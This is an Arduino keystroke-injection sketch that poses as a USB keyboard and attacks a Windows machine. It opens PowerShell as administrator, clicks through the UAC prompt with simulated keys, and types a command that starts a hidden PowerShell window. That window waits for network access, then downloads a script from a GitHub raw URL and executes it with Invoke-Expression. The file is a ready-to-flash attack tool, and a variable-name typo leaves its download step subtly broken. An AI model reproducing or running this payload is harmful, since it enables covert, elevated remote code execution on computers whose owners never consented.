#include <Keyboard.h>


static const char *command = R"(
$main_scirpt_url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/refs/heads/main/scripts/main.ps1"

$command_to_run = @"
     while($true) {
        try {
            Test-Connection github.com -Count 1 -ErrorAction Stop;
            Invoke-Expression (
                Invoke-WebRequest -Uri $main_script_url -UseBasicParsing | Select-Object -ExpandProperty Content
            );
            break
        } catch {
            Start-Sleep -Seconds 10
        }
    }
"@

Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command $command_to_run";
exit
)";


void setup() {
    Keyboard.begin();
    delay(2000);

    // Reset Keyboard Layout to QWERTY
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.write(' ');
    delay(500);
    Keyboard.write('2');
    Keyboard.releaseAll();
    delay(100); // TODO: consider removing

    // Search for PowerShell
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.write('q');
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("PowerShell");
    delay(400);

    // Run as Root
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(100);
    Keyboard.write(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    // Agree to the UAC
    Keyboard.write(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(1500);

    // Download and Run PowerShell Script
    Keyboard.print(command);
    Keyboard.write(KEY_RETURN); 
}

void loop() {}
